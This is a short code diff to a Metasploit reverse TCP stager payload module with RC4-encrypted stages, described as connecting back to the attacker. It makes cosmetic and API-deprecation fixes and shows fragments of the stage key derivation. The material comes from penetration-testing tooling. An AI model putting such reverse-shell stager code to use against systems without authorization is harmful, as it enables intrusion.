@@ -24,7 +24,7 @@ module Metasploit3
     super(
         Msf::Module::ModuleInfo.merge!(
             info,
-            'Name'          => 'Reverse TCP Stager (RC4 stage encryption DNS)',
+            'Name'          => 'Reverse TCP Stager (RC4 Stage Encryption DNS)',
             'Description'   => 'Connect back to the attacker',
             'Author'        => ['hdm', 'skape', 'sf', 'mihi', 'RageLtMan'],
             'License'       => MSF_LICENSE,
@@ -93,7 +93,7 @@ module Metasploit3
   end
 
   def generate_stage
-    m = OpenSSL::Digest::Digest.new('sha1')
+    m = OpenSSL::Digest.new('sha1')
     m.reset
     key = m.digest(datastore["RC4PASSWORD"] || "")
     c1 = OpenSSL::Cipher::Cipher.new('RC4')
@@ -106,7 +106,7 @@ module Metasploit3
   def internal_generate
     p = super
     # Write keys into stage
-    m = OpenSSL::Digest::Digest.new('sha1')
+    m = OpenSSL::Digest.new('sha1')
     m.reset
     key = m.digest(datastore["RC4PASSWORD"] || "")
     p[offsets['XORKey'][0], 4] = key[0,4]
